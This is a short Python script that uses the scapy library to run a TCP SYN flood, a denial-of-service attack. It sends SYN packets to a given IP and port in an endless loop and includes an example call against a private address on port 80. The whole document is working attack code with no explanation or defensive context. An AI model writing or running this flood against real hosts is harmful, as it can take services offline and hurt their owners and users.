from scapy.all import IP, TCP, send

def syn_flood(target_ip, target_port):
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port, flags='S')  # SYN flag
    packet = ip / tcp

    while True:
        send(packet, verbose=False)

# Example usage
syn_flood("192.168.1.153", 80)
